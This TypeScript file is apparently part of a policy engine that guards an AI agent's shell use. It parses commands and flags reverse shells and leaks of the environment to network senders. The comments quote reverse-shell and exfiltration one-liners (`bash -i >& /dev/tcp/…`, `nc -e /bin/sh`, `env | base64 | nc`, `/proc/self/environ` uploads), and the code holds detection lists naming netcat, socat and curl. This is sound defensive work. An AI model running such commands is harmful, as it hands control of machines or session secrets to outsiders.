// packages/policy-engine/src/shell/outbound.ts
// Two outbound actions read from the parsed command (node9Firewall#415 items
// 1 and 3).
//
// commands.reverse-shell: a shell whose input or output is a network socket.
// The machine is then driven from the other end. The shapes, by mechanism:
//   - a shell with a redirect to bash's `/dev/tcp/HOST/PORT` (or udp):
//     `bash -i >& /dev/tcp/h/4444 0>&1`, `sh -i 5<> /dev/tcp/h/p 0<&5 1>&5`;
//   - `exec N<>/dev/tcp/…` followed, in the same command, by a shell or by a
//     command whose name is a variable (`while read l; do $l; done <&5`);
//   - a netcat that runs a program for the connection: `nc -e /bin/sh h p`,
//     `ncat --sh-exec`, `nc -c bash` (also in a short-flag bundle, `-nve`);
//   - socat joining a program address (`exec:`, `system:`) to a network one;
//   - a pipeline in which a shell reading its stdin and a network client
//     (nc, ncat, netcat, telnet, socat, openssl s_client, a `/dev/tcp`
//     redirect) are both stages: `cat f | sh -i 2>&1 | nc h p > f`.
//   `curl … | sh` is commands.curl-pipe-shell and is not repeated here.
//
// data.env-exfil: the whole environment (where the agent's own API keys live)
// handed to a command that sends data out. The dumps: `env` with nothing to
// run, `printenv`, `set` and `export` / `declare -x` / `declare -p` /
// `typeset` with no names, and any read of `/proc/<pid>/environ`. The ways it
// reaches the sender: a command or process substitution in its arguments
// (`curl -d "$(env | grep KEY)"`, `-F f=@<(env)`), a variable assigned from one
// earlier in the command (`E=$(env); curl -d "$E"`), a pipeline (`env | base64 |
// nc h p`), or `/proc/self/environ` as the sender's own operand or input.
//
// Pure: a string in, findings out. `sh -c` / `eval` payloads and a heredoc on
// a shell's stdin are re-parsed. A command that does not parse yields nothing
// (`parsed: false`); the other tiers still judge it.

import mvdanSh from 'mvdan-sh';
import {
  SHELL_INTERPRETERS,
  baseWord,
  destTokensForBinary,
  devNetRedirectHost,
  isListOp,
  literalShellPayload,
  parseDestHost,
  parseShared,
  redirectWords,
  resolveWordLiteral,
  unwrapCommandHead,
} from './index';

// eslint-disable-next-line @typescript-eslint/no-explicit-any
const { syntax } = mvdanSh as any;

export type OutboundCheckId = 'commands.reverse-shell' | 'data.env-exfil';

export interface OutboundFinding {
  checkId: OutboundCheckId;
  /** The rule name the audit log and the catalog's legacy table know. */
  ruleName: 'block-reverse-shell' | 'review-env-exfil';
  reason: string;
  description: string;
  /** data.env-exfil only: the hosts the environment is sent to, or null when
   *  one sender's destination cannot be read (a dynamic or dotless host, a
   *  sender whose destination argument is unknown). A trusted-host exemption
   *  needs every one of them. */
  destinations?: string[] | null;
}

export interface OutboundAnalysis {
  /** False when mvdan-sh could not parse the command: nothing was judged. */
  parsed: boolean;
  findings: OutboundFinding[];
}

/** Shells that run what they read on stdin: the engine's list plus the
 *  smaller POSIX and C shells a reverse shell is often written with. */
const SHELLS = new Set([...SHELL_INTERPRETERS, 'mksh', 'ash', 'csh', 'tcsh']);
const NETCATS = new Set(['nc', 'ncat', 'netcat', 'nc.traditional', 'nc.openbsd']);
/** Network clients that carry a pipeline's bytes to and from a host. */
const NET_CLIENTS = new Set([...NETCATS, 'telnet', 'socat']);
/** Commands that send data to another host: the env-exfil sinks. */
const SENDERS = new Set([
  ...NET_CLIENTS,
  'curl',
  'wget',
  'ssh',
  'scp',
  'rsync',
  'ftp',
  'sftp',
  'http',
  'https',
  'xh',
  'iwr',
  'invoke-webrequest',
  'irm',
  'invoke-restmethod',
  'openssl',
]);
/** netcat's long options that run a program for the connection (ncat). */
const NETCAT_EXEC_LONG = new Set(['--exec', '--sh-exec', '--lua-exec']);
/** Declaration builtins that print every variable when given no name. */
const DECL_DUMPS = new Set(['export', 'declare', 'typeset']);
const PROC_ENVIRON_RE = /^\/proc\/[^/\s]+\/environ$/;
const DEV_NET_RE = /^\/dev\/(?:tcp|udp)\//i;
/** socat address types that run a program. */
const SOCAT_PROGRAM_RE = /^(?:exec|system)[:,]/i;
/** socat address types that open a network connection or listener. */
const SOCAT_NET_RE =
  /^(?:tcp|tcp4|tcp6|udp|udp4|udp6|ssl|openssl|sctp|tcp-connect|tcp-listen|tcp4-listen|tcp6-listen|udp-listen|openssl-connect|openssl-listen|ssl-l)[:,]/i;
// Word-bounded, so `sync`, `func`, `venv` and `locate` do not wake the walk.
const PRESCREEN_RE =
  /\/dev\/(?:tcp|udp)|\b(?:nc|ncat|netcat|telnet|socat|s_client|env|printenv|set|export|declare|typeset)\b|environ/i;
const MAX_PAYLOAD_DEPTH = 4;
const CACHE_MAX = 1_000;
const cache = new Map<string, OutboundAnalysis>();

/** A BinaryCmd that is a pipe (`|`, `|&`), not a list (`&&`, `||`). */
function isPipeOp(op: number): boolean {
  return !isListOp(op);
}

/** The redirect operator of a duplication from an fd (`<&5`), derived from a
 *  sample so a parser version that renumbers its tokens is followed. */
let dupInOp: number | null = null;
function isDupInOp(op: number): boolean {
  if (dupInOp === null) {
    let found = -1;
    try {
      syntax.Walk(parseShared('cat <&3'), (node: unknown) => {
        const n = node as Node;
        if (found === -1 && n && syntax.NodeType(n) === 'Stmt' && n.Redirs?.[0]) {
          found = n.Redirs[0].Op;
        }
        return true;
      });
    } catch {
      found = -1;
    }
    dupInOp = found;
  }
  return op === dupInOp;
}

export function analyzeOutbound(command: string): OutboundAnalysis {
  if (!PRESCREEN_RE.test(command.replace(/[\\'"]/g, ''))) return { parsed: true, findings: [] };
  const hit = cache.get(command);
  if (hit) {
    cache.delete(command);
    cache.set(command, hit);
    return hit;
  }
  const findings: OutboundFinding[] = [];
  const walk = new OutboundWalk(findings);
  const parsed = walk.run(command, 0);
  const envOut = findings.find((f) => f.checkId === 'data.env-exfil');
  if (envOut) envOut.destinations = walk.envDestinations();
  const computed = { parsed, findings };
  if (cache.size >= CACHE_MAX) {
    const oldest = cache.keys().next().value;
    if (oldest !== undefined) cache.delete(oldest);
  }
  cache.set(command, computed);
  return computed;
}

const REVERSE_SHELL_DESCRIPTION =
  'A shell wired to a network socket lets whoever is at the other end run commands on this machine.';
const ENV_EXFIL_DESCRIPTION =
  'The environment holds the API keys and tokens of this session; sending all of it out exposes every one of them.';

// eslint-disable-next-line @typescript-eslint/no-explicit-any
type Node = any;

/** Resolved argv of a CallExpr; null marks a dynamic word. */
function wordsOf(call: Node): (string | null)[] {
  return ((call?.Args || []) as Node[]).map((a) => resolveWordLiteral(a));
}

/** A word's text with each dynamic part (`$$`, `$PPID`, `$(…)`) as `X`, so a
 *  path shape still reads when its pid is a variable: `/proc/$$/environ`. */
function wordShape(word: Node): string {
  const parts: Node[] = word?.Parts || [];
  let out = '';
  for (const p of parts) {
    const t = syntax.NodeType(p);
    if (t === 'Lit' || t === 'SglQuoted') out += p.Value ?? '';
    else if (t === 'DblQuoted') out += wordShape(p);
    else out += 'X';
  }
  return out;
}

/** A word that is a read of some process's environment, `/proc/<pid>/environ`,
 *  whether the pid is written out or a variable. `@` and `--flag=` prefixes
 *  (`-d @/proc/self/environ`, `--post-file=…`) are stripped first. */
function isProcEnviron(word: Node): boolean {
  return PROC_ENVIRON_RE.test(wordShape(word).replace(/^.*[@=]/, ''));
}

/** Any argument or redirect of this statement reads `/proc/<pid>/environ`. */
function readsProcEnviron(stmt: Node): boolean {
  const args: Node[] = stmt?.Cmd?.Args || [];
  const redirs: Node[] = (stmt?.Redirs || []).filter((r: Node) => r?.Word);
  return args.slice(1).some(isProcEnviron) || redirs.some((r) => isProcEnviron(r.Word));
}

/** A placeholder for a dynamic word, so the destination reader keeps its
 *  position: it is no host (parseDestHost needs a dot), so it is unknown. */
const DYNAMIC_WORD = 'dynamic\u0000';

/** The hosts a sender call sends to, or null when they cannot be read. */
function senderHosts(head: string, args: (string | null)[]): string[] | null {
  const tokens = destTokensForBinary(
    head,
    args.map((w) => (w === null ? DYNAMIC_WORD : w))
  );
  const hosts = tokens.map((t) => parseDestHost(t));
  if (hosts.length === 0 || hosts.some((h) => h === null)) return null;
  return hosts as string[];
}

/** The hosts of a statement's `/dev/tcp` redirects, or null when one is dynamic. */
function socketHosts(stmt: Node): string[] | null {
  const hosts: string[] = [];
  for (const r of (stmt?.Redirs || []) as Node[]) {
    if (!r?.Word) continue;
    const shape = wordShape(r.Word);
    if (!DEV_NET_RE.test(shape)) continue;
    const host = devNetRedirectHost(resolveWordLiteral(r.Word));
    if (host === null) return null;
    hosts.push(host);
  }
  return hosts.length > 0 ? hosts : null;
}

/** Multi-call binaries whose first operand is the applet that runs. */
const MULTICALL = new Set(['busybox', 'toybox']);

/** The head command name after the wrappers, and its index. */
function headOf(words: (string | null)[]): { head: string; at: number } {
  let at = unwrapCommandHead(words);
  // `busybox nc -e /bin/sh h p`: the applet is the command.
  if (MULTICALL.has(baseWord(words[at])) && at + 1 < words.length) at += 1;
  return { head: baseWord(words[at]), at };
}

/** Shell options whose next word is their value (`--rcfile FILE`, `-o OPT`). */
const SHELL_VALUE_OPTIONS = new Set(['--rcfile', '--init-file', '-o', '+o', '-O', '+O']);

/** A shell call with no script operand and no `-c`: it runs its stdin. */
function shellReadsStdin(words: (string | null)[], at: number): boolean {
  const rest = words.slice(at + 1);
  for (let i = 0; i < rest.length; i++) {
    const w = rest[i];
    if (w === null) return false;
    if (SHELL_VALUE_OPTIONS.has(w)) {
      i++; // its value
      continue;
    }
    if (!/^[-+]/.test(w) || /^-[a-z]*c/i.test(w)) return false;
  }
  return true;
}

/** The first word of a program operand, unquoted (`'bash -i'` -> `bash`). */
function programWord(word: string | null | undefined): string | null {
  if (!word) return null;
  return word
    .trim()
    .split(/[\s,]/)[0]
    .replace(/^["']|["']$/g, '');
}

/** A program a bind or reverse shell hands the connection to: a shell. */
function isShellProgram(word: string | null | undefined): boolean {
  const first = programWord(word);
  if (!first) return false;
  return SHELLS.has(baseWord(first)) || /(?:^|[\\/])cmd(?:\.exe)?$/i.test(first);
}

const INTERPRETERS = /^(?:python[0-9.]*|perl|ruby|node|nodejs|php|lua|tclsh|expect)$/;

/** A program named as one: a shell, an interpreter, or a path (`/tmp/payload`,
 *  `./x`). A bare name that is none of these is more likely a host name
 *  (OpenBSD's `nc -e NAME` is the peer's certificate name). */
function isProgramWord(word: string | null | undefined): boolean {
  const first = programWord(word);
  if (!first || first.startsWith('-')) return false;
  return isShellProgram(first) || INTERPRETERS.test(baseWord(first)) || /[\\/]|\.exe$/i.test(first);
}

/**
 * netcat handing the connection to a program: `--exec` / `--sh-exec` /
 * `--lua-exec`, or `-e` / `-c` (alone or ending a short bundle, `-nve`).
 * A shell is a bind or reverse shell either way. Another program is one only
 * when nc connects out: a listener running a handler (`ncat -l 8080 --exec
 * ./handler`) is an inetd-style server. OpenBSD's nc reads `-c` as "use TLS"
 * and `-e NAME` as a certificate name, which name no program.
 */
function netcatRunsProgram(words: (string | null)[], at: number): boolean {
  const rest = words.slice(at + 1);
  const listening = rest.some(
    (w) => w === '--listen' || (w !== null && /^-[a-zA-Z]*l[a-zA-Z]*$/.test(w))
  );
  return rest.some((w, i) => {
    if (w === null) return false;
    const eq = w.indexOf('=');
    const long = eq > 0 ? w.slice(0, eq) : w;
    let program: string | null | undefined;
    // getopt also takes the value attached: `-e/bin/sh`, `-nve/bin/sh`.
    const attached = /^-[nvzlkuUdDrtCbh46]*[ec](.+)$/.exec(w);
    if (NETCAT_EXEC_LONG.has(long)) program = eq > 0 ? w.slice(eq + 1) : rest[i + 1];
    else if (/^-[a-zA-Z]*[ec]$/.test(w)) program = rest[i + 1];
    else if (attached) program = attached[1];
    else return false;
    // A Lua script is the program whatever its name.
    if (long === '--lua-exec' && !listening) return true;
    return isShellProgram(program) || (!listening && isProgramWord(program));
  });
}

/** socat joining a program address (`exec:`, `system:`) to a network one: a
 *  shell always; another program only when socat connects out, since a
 *  listener running one (`TCP-LISTEN:8080,fork EXEC:./serve.sh`) is a server. */
function socatRunsProgram(words: (string | null)[], at: number): boolean {
  const addrs = words.slice(at + 1).filter((w): w is string => w !== null && !w.startsWith('-'));
  const programs = addrs
    .filter((a) => SOCAT_PROGRAM_RE.test(a))
    .map((a) => a.slice(a.search(/[:,]/) + 1));
  const nets = addrs.filter((a) => SOCAT_NET_RE.test(a));
  if (programs.length === 0 || nets.length === 0) return false;
  const listening = nets.some((a) => /^[a-z0-9-]*listen[:,]|^ssl-l[:,]/i.test(a));
  return programs.some((p) => isShellProgram(p) || (!listening && isProgramWord(p)));
}

/** An env dump: what the call prints is the whole environment. `procRead`:
 *  the statement reads `/proc/<pid>/environ` (readsProcEnviron). */
function callDumpsEnv(words: (string | null)[], procRead: boolean): boolean {
  const name = baseWord(words[0]);
  // `printenv NAME` prints one variable; only a bare `printenv` (`-0` at most)
  // prints the environment.
  if (name === 'printenv') return words.slice(1).every((w) => w !== null && w.startsWith('-'));
  if (name === 'env') {
    // `env` with only options and assignments prints; with a command it runs it.
    let i = 1;
    while (i < words.length) {
      const w = words[i];
      if (w === null) return false;
      if (w === '-u' || w === '--unset' || w === '-C' || w === '--chdir' || w === '-S') i += 2;
      else if (w.startsWith('-') || /^[A-Za-z_]\w*=/.test(w)) i += 1;
      else return false;
    }
    return true;
  }
  if (name === 'set' && words.length === 1) return true;
  return procRead;
}

/** An env dump behind wrappers too: `sudo printenv`, `nohup env`. */
function dumpsEnv(words: (string | null)[], stmt: Node): boolean {
  const procRead = readsProcEnviron(stmt);
  const end = Math.min(headOf(words).at, words.length - 1);
  for (let i = 1; i <= end; i++) {
    const b = baseWord(words[i]);
    if ((b === 'env' || b === 'printenv') && callDumpsEnv(words.slice(i), procRead)) return true;
  }
  return callDumpsEnv(words, procRead);
}

/** `export`, `declare -x`, `declare -p`, `typeset` with no names. */
function declDumpsEnv(decl: Node): boolean {
  const variant: string = decl?.Variant?.Value ?? '';
  if (!DECL_DUMPS.has(variant)) return false;
  const args: Node[] = decl.Args || [];
  // A DeclClause arg is an Assign: a bare name (`export X`) or a flag word.
  for (const a of args) {
    if (a?.Name?.Value) return false;
    const w = a?.Value ? resolveWordLiteral(a.Value) : null;
    if (w === null || !w.startsWith('-')) return false;
    // `declare -f`, `typeset -F`: functions, no variables.
    if (/^-[a-zA-Z]*[fF]/.test(w)) return false;
  }
  return true;
}

class OutboundWalk {
  private payloads = new Set<string>();
  private seen = new Set<string>();
  /** Variables assigned from an env dump earlier in the command. */
  private envVars = new Set<string>();
  /** File descriptors `exec` opened on a network socket. */
  private netFds = new Set<string>();
  /** Where each env-exfil sender sends; one unknown destination makes the
   *  whole set unknown. */
  private envSinks = new Set<string>();
  private envSinkUnknown = false;

  constructor(private readonly findings: OutboundFinding[]) {}

  run(command: string, depth: number): boolean {
    const f = parseShared(command);
    if (!f || typeof f !== 'object' || !f.Stmts) return false;
    try {
      syntax.Walk(f, (node: unknown) => this.visit(node as Node, depth));
    } catch {
      return false;
    }
    return true;
  }

  private found(checkId: OutboundCheckId, reason: string): void {
    if (this.seen.has(checkId)) return;
    this.seen.add(checkId);
    this.findings.push(
      checkId === 'commands.reverse-shell'
        ? {
            checkId,
            ruleName: 'block-reverse-shell',
            reason: `Reverse shell: ${reason}`,
            description: REVERSE_SHELL_DESCRIPTION,
          }
        : {
            checkId,
            ruleName: 'review-env-exfil',
            reason: `Environment sent out: ${reason}`,
            description: ENV_EXFIL_DESCRIPTION,
          }
    );
  }

  private reverseShell(reason: string): void {
    this.found('commands.reverse-shell', reason);
  }

  /** The environment leaves through a sender with these destinations. Every
   *  occurrence is recorded, not only the first one `found` reports. */
  private envOut(reason: string, hosts: string[] | null): void {
    this.found('data.env-exfil', reason);
    if (hosts === null) this.envSinkUnknown = true;
    else for (const h of hosts) this.envSinks.add(h);
  }

  /** The hosts the environment was sent to, or null when one is unknown. */
  envDestinations(): string[] | null {
    return this.envSinkUnknown || this.envSinks.size === 0 ? null : [...this.envSinks];
  }

  private visit(n: Node, depth: number): boolean {
    if (!n) return false;
    const type = syntax.NodeType(n);
    if (type === 'Stmt') {
      this.visitStmt(n, depth);
      return true;
    }
    if (type === 'BinaryCmd' && isPipeOp(n.Op)) {
      this.visitPipeline(n);
      return true;
    }
    if (type === 'CallExpr') {
      this.visitCall(n, depth);
      return true;
    }
    return true;
  }

  private visitStmt(stmt: Node, depth: number): void {
    const cmd = stmt.Cmd;
    const redirs = redirectWords(stmt);
    const toSocket = redirs.some((w) => w !== null && DEV_NET_RE.test(w));
    if (!cmd) return;
    const type = syntax.NodeType(cmd);
    if (type !== 'CallExpr' || wordsOf(cmd).length > 0) {
      // Anything that reads a socket fd `exec` opened: `sh <&5 >&5`,
      // `while read l; do $l; done <&5`.
      if (this.readsNetFd(stmt) && runsCommandsIn(stmt)) {
        this.reverseShell('commands are read from a network socket opened with exec');
      }
    }
    if (type === 'CallExpr') {
      const words = wordsOf(cmd);
      if (words.length === 0) {
        // `E=$(env)`: the variable now holds the environment.
        for (const a of (cmd.Assigns || []) as Node[]) {
          if (a?.Name?.Value && a.Value && this.carriesEnv(a.Value)) this.envVars.add(a.Name.Value);
        }
        return;
      }
      const { head, at } = headOf(words);
      if (toSocket && SHELLS.has(head) && shellReadsStdin(words, at)) {
        this.reverseShell(`${head} has its input or output redirected to a network socket`);
      }
      // `exec` is a wrapper to the head finder; with no command after it, it
      // only applies its redirects to the rest of the script.
      if (baseWord(words[0]) === 'exec' && words.length === 1 && toSocket) {
        // `exec 5<>/dev/tcp/h/p`: the fd stays open for the rest of the command.
        for (const r of (stmt.Redirs || []) as Node[]) {
          const w = r?.Word ? resolveWordLiteral(r.Word) : null;
          if (w !== null && DEV_NET_RE.test(w)) this.netFds.add(r.N?.Value ?? '0');
        }
      }
      if (SENDERS.has(head)) {
        const dest = senderHosts(head, words.slice(at + 1));
        if (((stmt.Redirs || []) as Node[]).some((r) => r?.Word && isProcEnviron(r.Word))) {
          this.envOut(`${head} reads /proc/…/environ as its input`, dest);
        }
        // `curl -d @- … <<< "$(env)"`, or an expanding heredoc that holds it.
        const stdin = ((stmt.Redirs || []) as Node[]).some(
          (r) => (r?.Word && this.carriesEnv(r.Word)) || (r?.Hdoc && this.carriesEnv(r.Hdoc))
        );
        if (stdin) this.envOut(`${head} reads an env dump on its input`, dest);
      }
      // `env > /dev/tcp/h/p`, `echo "$(env)" > /dev/tcp/h/p`: the socket is the sender.
      if (
        toSocket &&
        (dumpsEnv(words, stmt) || ((cmd.Args || []) as Node[]).some((a) => this.carriesEnv(a)))
      ) {
        this.envOut('the environment is written to a network socket', socketHosts(stmt));
      }
      // A heredoc on a shell's stdin is the script it runs.
      if (depth < MAX_PAYLOAD_DEPTH && SHELLS.has(head) && shellReadsStdin(words, at)) {
        const hdoc = ((stmt.Redirs || []) as Node[]).find(
          (r) => r?.Hdoc && (r.N == null || r.N.Value === '0')
        );
        const text = hdoc ? resolveWordLiteral(hdoc.Hdoc) : null;
        if (text !== null) this.runPayload(text, depth);
      }
      return;
    }
    if (type === 'DeclClause') {
      if (toSocket && declDumpsEnv(cmd)) {
        this.envOut('the environment is written to a network socket', socketHosts(stmt));
      }
      // `export E="$(env)"`, `declare E=$(printenv)`.
      for (const a of (cmd.Args || []) as Node[]) {
        if (a?.Name?.Value && a.Value && this.carriesEnv(a.Value)) this.envVars.add(a.Name.Value);
      }
    }
  }

  private visitCall(call: Node, depth: number): void {
    const words = wordsOf(call);
    if (words.length === 0) return;
    const { head, at } = headOf(words);
    if (NETCATS.has(head) && netcatRunsProgram(words, at)) {
      this.reverseShell(`${head} runs a program for the connection`);
    }
    if (head === 'socat' && socatRunsProgram(words, at)) {
      this.reverseShell('socat joins a program to a network address');
    }
    if (SENDERS.has(head)) {
      const args: Node[] = call.Args || [];
      const dest = senderHosts(head, words.slice(at + 1));
      for (let i = at + 1; i < args.length; i++) {
        // `@/proc/self/environ`, `--post-file=/proc/$$/environ`.
        if (isProcEnviron(args[i])) {
          this.envOut(`${head} sends /proc/…/environ`, dest);
        } else if (this.carriesEnv(args[i])) {
          this.envOut(`the output of an env dump is an argument of ${head}`, dest);
        }
      }
    }
    if (depth < MAX_PAYLOAD_DEPTH) {
      const payload = literalShellPayload(words, baseWord(words[0]));
      if (payload !== null) this.runPayload(payload, depth);
    }
  }

  /** A pipeline, flattened to its stages in order. */
  private visitPipeline(bin: Node): void {
    const stages: Node[] = [];
    const flatten = (s: Node): void => {
      const c = s?.Cmd;
      if (c && syntax.NodeType(c) === 'BinaryCmd' && isPipeOp(c.Op)) {
        flatten(c.X);
        flatten(c.Y);
      } else stages.push(s);
    };
    flatten(bin.X);
    flatten(bin.Y);
    let shell = -1;
    let net = -1;
    let dump = -1;
    let sender = -1;
    /** Each sending stage's destinations (null: unknown). */
    const sinks = new Map<number, string[] | null>();
    stages.forEach((st, i) => {
      const c = st?.Cmd;
      const redirs = redirectWords(st);
      const socket = redirs.some((w) => w !== null && DEV_NET_RE.test(w));
      if (socket || this.readsNetFd(st)) net = i;
      // A later stage writing to a socket sends what the pipeline carries.
      if (socket && i > 0) {
        sender = Math.max(sender, i);
        sinks.set(i, socketHosts(st));
      }
      if (!c) return;
      if (syntax.NodeType(c) === 'DeclClause' && declDumpsEnv(c) && dump < 0) dump = i;
      // A loop that runs each line it reads (`while read l; do $l; done`).
      if (syntax.NodeType(c) !== 'CallExpr') {
        if (runsCommandsIn(st)) shell = i;
        return;
      }
      const words = wordsOf(c);
      if (words.length === 0) return;
      const { head, at } = headOf(words);
      if (SHELLS.has(head) && shellReadsStdin(words, at)) shell = i;
      if (NET_CLIENTS.has(head)) net = i;
      if (head === 'openssl' && words[at + 1] === 's_client') net = i;
      const carries = ((c.Args || []) as Node[]).some((a) => this.carriesEnv(a));
      if ((dumpsEnv(words, st) || carries) && dump < 0) dump = i;
      if (SENDERS.has(head) && i > 0) {
        sender = Math.max(sender, i);
        const dest = senderHosts(head, words.slice(at + 1));
        const prior = sinks.get(i);
        // A stage that also writes to a socket sends to both.
        sinks.set(i, prior === undefined ? dest : prior && dest ? [...prior, ...dest] : null);
      }
    });
    if (shell >= 0 && net >= 0) {
      this.reverseShell('a shell and a network client are joined in one pipeline');
    }
    if (dump >= 0 && sender > dump) {
      const after = [...sinks].filter(([i]) => i > dump).map(([, h]) => h);
      const dest = after.some((h) => h === null) ? null : (after.flat() as string[]);
      this.envOut('an env dump is piped into a command that sends data out', dest);
    }
  }

  /** This statement READS a socket fd `exec` opened (`<&5`). Writing to one
   *  (`>&5`) only sends data; the commands must come from the socket. */
  private readsNetFd(stmt: Node): boolean {
    if (this.netFds.size === 0) return false;
    return ((stmt?.Redirs || []) as Node[]).some((r) => {
      if (!r?.Word || !isDupInOp(r.Op)) return false;
      const w = resolveWordLiteral(r.Word);
      return w !== null && this.netFds.has(w.replace(/-$/, ''));
    });
  }

  /** A word (or assignment value) whose text includes an env dump's output. */
  private carriesEnv(word: Node): boolean {
    let hit = false;
    syntax.Walk(word, (node: unknown) => {
      if (hit || !node) return false;
      const n = node as Node;
      const t = syntax.NodeType(n);
      if (t === 'ParamExp' && n.Param?.Value && this.envVars.has(n.Param.Value)) {
        hit = true;
        return false;
      }
      if (t === 'CmdSubst' || t === 'ProcSubst') {
        if (this.stmtsDumpEnv(n.Stmts || [])) hit = true;
        return !hit;
      }
      return true;
    });
    return hit;
  }

  /** Any command inside these statements is an env dump. */
  private stmtsDumpEnv(stmts: Node[]): boolean {
    let hit = false;
    for (const s of stmts) {
      syntax.Walk(s, (node: unknown) => {
        if (hit || !node) return false;
        const n = node as Node;
        const t = syntax.NodeType(n);
        if (t === 'Stmt' && n.Cmd && syntax.NodeType(n.Cmd) === 'CallExpr') {
          const words = wordsOf(n.Cmd);
          if (words.length > 0 && dumpsEnv(words, n)) hit = true;
        }
        if (t === 'DeclClause' && declDumpsEnv(n)) hit = true;
        return !hit;
      });
      if (hit) return true;
    }
    return false;
  }

  private runPayload(payload: string, depth: number): void {
    if (this.payloads.has(payload)) return;
    this.payloads.add(payload);
    this.run(payload, depth + 1);
  }
}

/** The variable a word is, when it is only one (`$line`, `${line}`, `"$line"`). */
function paramName(word: Node): string | null {
  let parts: Node[] = word?.Parts || [];
  if (parts.length === 1 && syntax.NodeType(parts[0]) === 'DblQuoted') parts = parts[0].Parts || [];
  if (parts.length !== 1 || syntax.NodeType(parts[0]) !== 'ParamExp') return null;
  return parts[0].Param?.Value ?? null;
}

/** A word that expands one of these variables anywhere inside it. */
function refersTo(word: Node, names: Set<string>): boolean {
  let hit = false;
  syntax.Walk(word, (node: unknown) => {
    if (hit || !node) return false;
    const n = node as Node;
    if (syntax.NodeType(n) === 'ParamExp' && names.has(n.Param?.Value)) hit = true;
    return !hit;
  });
  return hit;
}

/**
 * A statement that runs the commands it is handed: a shell reading stdin, or
 * a line taken with `read` and then run (`while read l; do $l; done`,
 * `eval "$l"`, `sh -c "$l"`). A variable naming a fixed program
 * (`"$HANDLER" "$f"`) is handed data, not commands.
 */
function runsCommandsIn(stmt: Node): boolean {
  const readVars = new Set<string>();
  let hit = false;
  syntax.Walk(stmt, (node: unknown) => {
    if (hit || !node) return false;
    const n = node as Node;
    if (syntax.NodeType(n) !== 'CallExpr') return true;
    const words = wordsOf(n);
    if (words.length === 0) return true;
    const { head, at } = headOf(words);
    const args: Node[] = n.Args || [];
    if (head === 'read') {
      for (const w of words.slice(at + 1)) if (w && /^[A-Za-z_]\w*$/.test(w)) readVars.add(w);
      return true;
    }
    if (SHELLS.has(head) && shellReadsStdin(words, at)) hit = true;
    else if (readVars.size > 0) {
      const name = paramName(args[at]);
      if (name !== null && readVars.has(name)) hit = true;
      else if (
        (head === 'eval' || SHELLS.has(head)) &&
        args.slice(at + 1).some((a) => refersTo(a, readVars))
      )
        hit = true;
    }
    return !hit;
  });
  return hit;
}
